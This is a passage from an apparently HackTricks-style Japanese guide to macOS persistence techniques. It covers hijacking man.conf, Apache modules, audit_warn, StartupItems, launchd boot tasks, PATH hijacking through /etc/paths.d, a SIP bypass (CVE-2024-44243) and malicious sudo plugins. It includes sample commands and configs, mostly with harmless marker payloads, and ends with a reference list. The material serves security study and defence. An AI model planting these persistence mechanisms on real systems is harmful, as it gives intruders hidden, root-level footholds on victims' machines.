- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
  - root 権限が必要
  - **`/private/etc/man.conf`**: man が使われるたびに

#### Description & Exploit

設定ファイル **`/private/etc/man.conf`** は、man のドキュメントファイルを開くときに使用するバイナリ／スクリプトを指定します。そのため、実行ファイルのパスを変更すれば、ユーザーが man を使ってドキュメントを読むたびに backdoor を実行できます。<sup>[[31]](#references)</sup>

たとえば、**`/private/etc/man.conf`** に次のように設定します:

```
MANPAGER /tmp/view
```

その後、`/tmp/view` を次のように作成します:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root 権限が必要で、apache が実行中である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd には entitlements がありません

#### 場所

- **`/etc/apache2/httpd.conf`**
  - root 権限が必要
  - トリガー: Apache2 の起動時

#### 説明と Exploit

`/etc/apache2/httpd.conf` に次のような行を追加して、モジュールを読み込むよう指定できます:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

この方法で、コンパイルしたモジュールが Apache に読み込まれます。必要なのは、有効な Apple 証明書で**署名する**か、システムに**新しい信頼済み証明書を追加**して、それで**署名する**ことだけです。

次に、必要であれば、サーバーが確実に起動するように以下を実行します。

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb のコード例：

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root 権限が必要で、auditd が実行中であり、警告を発生させる必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
  - root 権限が必要
  - **Trigger**: auditd が警告を検出したとき

#### Description & Exploit

auditd が警告を検出すると、スクリプト **`/etc/security/audit_warn`** が**実行**されます。そのため、そこに payload を追加できます。<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

`sudo audit -n`を使って警告を強制的に表示できます。

### Startup Items

> [!CAUTION] > **これは非推奨のため、これらのディレクトリには何も見つからないはずです。**

**StartupItem**は、`/Library/StartupItems/`または`/System/Library/StartupItems/`のいずれかに配置されるディレクトリです。このディレクトリを作成したら、次の2つのファイルを含める必要があります。

1. **rc script**: 起動時に実行されるshell script。
2. **plist file**: `StartupParameters.plist`という名前のファイルで、さまざまな設定が含まれます。

起動プロセスが認識して利用できるよう、rc scriptと`StartupParameters.plist`ファイルの両方が**StartupItem**ディレクトリ内に正しく配置されていることを確認してください。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 私の macOS ではこのコンポーネントを確認できないため、詳細については writeup を確認してください。

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple によって導入された **emond** は、未成熟、あるいは放棄された可能性があるものの、現在も利用可能なログ記録の仕組みです。Mac の管理者にとって特に有益ではありませんが、この目立たないサービスは、脅威アクターにとって、ほとんどの macOS 管理者に気づかれにくい、巧妙な永続化手段となる可能性があります。<sup>[[34]](#references)</sup>

その存在を知っていれば、**emond** の悪用を特定するのは簡単です。このサービスの LaunchDaemon は、実行するスクリプトを特定のディレクトリ内で探します。これを確認するには、次のコマンドを使用できます。

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### 場所

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - root 権限が必要
  - **トリガー**: XQuartz 使用時

#### 説明と Exploit

XQuartz は**macOS にインストールされなくなった**ため、詳しくは writeup を確認してください。<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> kext のインストールは、root 権限があっても非常に複雑なため、exploit がない限り、実用的な sandbox escape や persistence の手法とはみなされません。

#### 場所

KEXT を startup item としてインストールするには、**以下のいずれかの場所にインストールする必要があります**。

- `/System/Library/Extensions`
  - OS X オペレーティングシステムに組み込まれている KEXT ファイル。
- `/Library/Extensions`
  - サードパーティ製ソフトウェアによってインストールされた KEXT ファイル

現在読み込まれている kext ファイルは、次のコマンドで一覧表示できます。

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### 場所

- **`/usr/local/bin/amstoold`**
  - Root 権限が必要

#### 説明と悪用

どうやら`/System/Library/LaunchAgents/com.apple.amstoold.plist`の`plist`は、このバイナリを使用しながらXPC serviceを公開していました。問題はバイナリが存在しなかったことです。そのため、そこに何かを配置しておけば、XPC serviceが呼び出されたときにそのバイナリが実行されます。<sup>[[35]](#references)</sup>

私のmacOSでは、もうこれを見つけられません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### 場所

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root 権限が必要
  - **トリガー**: serviceの実行時（まれ）

#### 説明と悪用

このスクリプトが実行されることはあまりないようです。また、私のmacOSでは見つけることすらできなかったため、詳しく知りたい場合はwriteupを確認してください。<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **これは最新のMacOSバージョンでは動作しません**

ここに**起動時に実行されるコマンド**を配置することもできます。通常のrc.commonスクリプトの例:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd Boot Tasks

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- sandbox の bypass に有用: [🔴](https://emojipedia.org/large-red-circle) (root が必要)
- root に加え、パスに応じて **SIP bypass** または **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access permission が必要

#### 場所

`launchd` は、初期の「boot tasks」を記述する plist を **`__TEXT,__config`** セクションに埋め込んでいます。いくつかの参照スクリプト/バイナリはデフォルトでは存在せず、攻撃者が作成できます。

- SIP-bypass セット: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA セット: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` は Sequoia 以降でのみ事前に存在)

#### 説明と悪用

埋め込みタスクテーブルをダンプして、`launchd` が実行するファイルと、サポートされるキー (`Program`、`ProgramArguments`、`PerformAfterUserspaceReboot`、`RequireSuccess`…) を確認します。

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

参照されているファイル（例: `/etc/rc.server`）を作成すると、次回の（userspace）再起動時に`launchd`がそのファイルを実行します。最も有用なエントリはSIPによって制限されているか、TCCのSysAdminFiles/Full Disk Accessが必要なため、これはrootレベルで再起動をトリガーとする手法です。<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

起動時に`rc.trampoline`ブートタスクが、NVRAM変数`apple-trusted-trampoline`に保存された**platform（Apple署名済み）バイナリ**を実行します。ただし、**`rc.trampoline=1`のブート引数が設定され、SIPが無効になっている場合に限ります**（サイズ上限は約390&nbsp;KBで、ブロックせず速やかに戻る必要があります）。**root + SIP無効化 + Apple署名済みのpayload**が必要なため、実環境でのpersistenceには実質的に使えず、ここでは完全性のためだけに記載しています。<sup>[[41]](#references)</sup>

### /etc/paths and /etc/paths.d (PATH hijack)

- sandboxのbypassに有用: [🔴](https://emojipedia.org/large-red-circle)（書き込みにはrootが必要）
- rootが必要

#### Location

- **`/etc/paths`**および**`/etc/paths.d/*`** — ログイン時にデフォルトの`PATH`を構築するため、**`path_helper`**（`/etc/zprofile`から呼び出される）が読み込みます。

#### Description & Exploitation

どちらもroot所有です。攻撃者が制御するディレクトリを先頭に追加（`/etc/paths`を編集するか、`/etc/paths.d/`にファイルを配置）すると、新しいログインシェルすべての`PATH`の早い位置にそのディレクトリが現れます。そのため、一般的なコマンド（`ls`、`git`など）と同じ名前の悪意あるバイナリが本物のコマンドを**shadow**し、被害者が次に実行したときに起動します。

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

解説: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- sandboxのbypassに有用: [🔴](https://emojipedia.org/large-red-circle) (rootが必要)
- rootが必要。結果として **SIPをbypass** する。影響を受けるmacOSは **15.0–15.1**、**15.2** で修正済み

#### 場所

- **`/Library/Filesystems/`** にfilesystem bundleを配置する。

#### 説明とExploit

`storagekitd` は entitlement **`com.apple.rootless.install.heritable`** を保持し、filesystem bundleのバイナリを、SIPをbypassするこの機能を **継承した状態で** 起動していた。悪意のあるfilesystem bundleを配置することで、攻撃者はSIP bypassを使ってコードを実行し、**永続的なkernel extension** をインストールしたり、SIPで保護された `LaunchDaemon` ディレクトリに書き込んだりできた。これは通常の保護を回避し、その後も存続する永続化手法だった。<sup>[[46]](#references)</sup> AppleはmacOS Sequoia 15.2で修正した。

### sudo plugins (/etc/sudo.conf)

解説: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- sandboxのbypassに有用: [🔴](https://emojipedia.org/large-red-circle) (`/etc/sudo.conf` への書き込みにrootが必要)
- インストールにrootが必要。pluginはその後、**すべての `sudo` 呼び出し** の内部で実行される (setuid-rootコンテキスト)

#### 場所

- **`/etc/sudo.conf`** — `Plugin` 行で、**`/usr/libexec/sudo/`** (または絶対パス) にあるshared objectを読み込む。デフォルトでは存在しない (sudoは組み込みのポリシーを使用する) ため、新規作成すれば余計な変更を加えずにhookできる。

#### 説明とExploit

`sudo` は `/etc/sudo.conf` からポリシー、承認、監査用のpluginを読み込む。`sudo` はsetuid-rootであるため、悪意のあるshared-object pluginは、ユーザーが `sudo` を実行するたびに **root権限で実行される**。すべてのsudoコマンドも確認できる、永続的なroot権限での永続化手法となる。<sup>[[51]](#references)</sup> macOSにはplugin APIに対応したsudo 1.9.xが付属している。

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

解説: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
最小例: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **レガシー機構:** macOS 12.3 以降で非推奨です。macOS 14.1 以降では、レガシー動画プラグインはデフォルトで無効です。この経路を利用するには、ユーザーがRecoveryからレガシー動画のサポートを復元する必要があります。書き込み可能なディレクトリがあるだけでは不十分です。[Appleの現行サポートガイダンス](https://support.apple.com/en-us/108387)を参照してください。
- プラグインディレクトリへの書き込みにはrootが必要です。コード実行には、DALプラグインを引き続き読み込む互換性のあるクライアントが必要です。macOS 26では実行時テストを行っていません。

#### 場所

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - rootが必要
  - **トリガー:** 互換性のあるカメラクライアントが、**レガシーサポートの復元後に**デバイスを列挙すること。クライアントのライブラリ検証により、サードパーティ製プラグインがブロックされる場合があります。

#### 説明と悪用

CoreMediaIO **DAL**（Device Abstraction Layer）プラグインは、一部のカメラアプリケーションでプロセス内に読み込まれていました。Appleの[カメラ拡張機能に関する発表](https://developer.apple.com/videos/play/wwdc2022/10022/)では、レガシーDALプラグインはFaceTime、QuickTime Player、Photo Boothでは**動作しなかった**こと、また他の多くのクライアントがライブラリ検証を適用していることが明記されています。最新の[Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio)は、別のインストールおよび承認モデルでプロセス外で実行されます。従来のプロセス内手法が、現行macOSで一般的なCamera TCC bypassとして使えることを意味するものではありません。<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26で読み取り専用の確認を行ったところ、`/Library/CoreMediaIO/Plug-Ins/DAL` は存在し、root所有でした。レガシーサポートの有効化も、いずれかのクライアントでの読み込みも確認していません。

### Directory Service Plugins

解説: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **レガシーの条件付き機構:** インストールにはrootが必要で、実際に設定され読み込まれるプラグインが必要です。DirectoryServiceのプラグインAPIは非推奨です。これを起動時のトリガーと見なす前に、対象MacのOpen Directory設定を確認してください。

#### 場所

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - rootが必要
  - **トリガー:** Open Directoryで必要になったとき、`dspluginhelperd`が条件を満たす設定済みプラグインを読み込みます。[Appleのプラグインランタイムガイド](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html)によると、起動時に読み込むよう設定されていないプラグインは、そのノードが開かれたときに遅延読み込みされる場合があります。

#### 説明と悪用

`dspluginhelperd`は、レガシーDirectoryServiceプラグインバンドルをサポートしています。レガシープラグインが受け入れられ、有効化される環境では、悪意あるプラグインが特権実行経路になり得ます。これはPAMやAuthorization Pluginsとは別の経路です。ディレクトリが存在するだけでは、新たに書き込んだプラグインが次回起動時に実行されることを示しません。macOS 26.5のApple提供ローカルマニュアル`dspluginhelperd(8)`および`opendirectoryd(8)`には、引き続きこのヘルパーとレガシー経路が記載されています。<sup>[[53]](#references)</sup>

macOS 26で読み取り専用の確認を行ったところ、`/Library/DirectoryServices/PlugIns` と `/usr/libexec/dspluginhelperd` が存在していました。このテストでは、プラグインのインストール、設定、読み込みは行っていません。

## Persistence techniques and tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025年、Infostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [おなじみのLaunchAgentsを超えて - 1 - シェル起動ファイル](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [おなじみのLaunchAgentsを超えて - 18 - X11とXQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [おなじみのLaunchAgentsを超えて - 21 - 再オープンされるアプリケーション](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [おなじみのLaunchAgentsを超えて - 20 - Terminalの環境設定](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [おなじみのLaunchAgentsを超えて - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins（SpecterOps）](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [おなじみのLaunchAgentsを超えて - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [おなじみのLaunchAgentsを超えて - 22 - LoginHookとLogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [おなじみのLaunchAgentsを超えて - 4 - cronジョブ](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [おなじみのLaunchAgentsを超えて - 2 - iTerm2の起動](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [おなじみのLaunchAgentsを超えて - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [おなじみのLaunchAgentsを超えて - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [おなじみのLaunchAgentsを超えて - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [おなじみのLaunchAgentsを超えて - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [おなじみのLaunchAgentsを超えて - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [おなじみのLaunchAgentsを超えて - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOSでのPersistenceのためのFolder Actions（SpecterOps）](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [おなじみのLaunchAgentsを超えて - 27 - Dockショートカット](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [おなじみのLaunchAgentsを超えて - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [おなじみのLaunchAgentsを超えて - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [「Mac File Opener」のPersistenceを分析する（Objective-See）](https://objective-see.org/blog/blog_0x11.html)
- [23] [おなじみのLaunchAgentsを超えて - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [アクセスを維持する: macOS PersistenceのためのScreensavers（SpecterOps）](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [おなじみのLaunchAgentsを超えて - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [おなじみのLaunchAgentsを超えて - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [おなじみのLaunchAgentsを超えて - 19 - 定期スクリプト](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [おなじみのLaunchAgentsを超えて - 5 - Pluggable Authentication Modules（PAM）](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [おなじみのLaunchAgentsを超えて - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Pluginsを利用した永続的な認証情報の窃取（SpecterOps）](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [おなじみのLaunchAgentsを超えて - 30 - manの設定ファイル - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [おなじみのLaunchAgentsを超えて - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [おなじみのLaunchAgentsを超えて - 31 - BSM監査フレームワーク](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [おなじみのLaunchAgentsを超えて - 23 - emond、イベント監視デーモン](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [おなじみのLaunchAgentsを超えて - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [おなじみのLaunchAgentsを超えて - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [おなじみのLaunchAgentsを超えて - 10 - アプリケーションスクリプトファイル](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [おなじみのLaunchAgentsを超えて - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [おなじみのLaunchAgentsを超えて - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [おなじみのLaunchAgentsを超えて - 34 - launchdの起動タスク](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [おなじみのLaunchAgentsを超えて - 35 - NVRAMを介したPersistence（apple-trusted-trampoline）](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [OS XでPersistenceにメールを利用する（n00py）](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Apple MailのルールPlistに対する不審な変更（Elastic）](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [悪意あるプロファイル - Macに対する最も深刻な脅威のひとつ（Jamf）](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 - Ch.0x2 Persistence（dyld）](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [CVE-2024-44243を分析する: kernel extensionsを介したmacOS SIP bypass（Microsoft）](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [Claude Codeプロジェクトファイルを介したRCEとAPI Tokenの流出（CVE-2025-59536、Check Point）](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub CopilotとCursorの新たな脆弱性 - Rules File Backdoor（Pillar Security）](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - 代替インストール方法（External Extensions）](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [MacのChromeでExtensionInstallForcelistを削除する（macsecurity.net）](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo Pluginsの作成について（sigma-star）](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [カスタムURLスキームを介したリモートMacの悪用（Objective-See）](https://objective-see.org/blog/blog_0x38.html)
- [53] [プラグインを悪用したmacOSの2つのPersistence手法（codecolorist）](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DALの最小例（johnboiles）](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: SpotlightベースのmacOS TCC脆弱性を分析する（Microsoft）](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` moduleのドキュメント（.pth / usercustomize / sitecustomize）](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
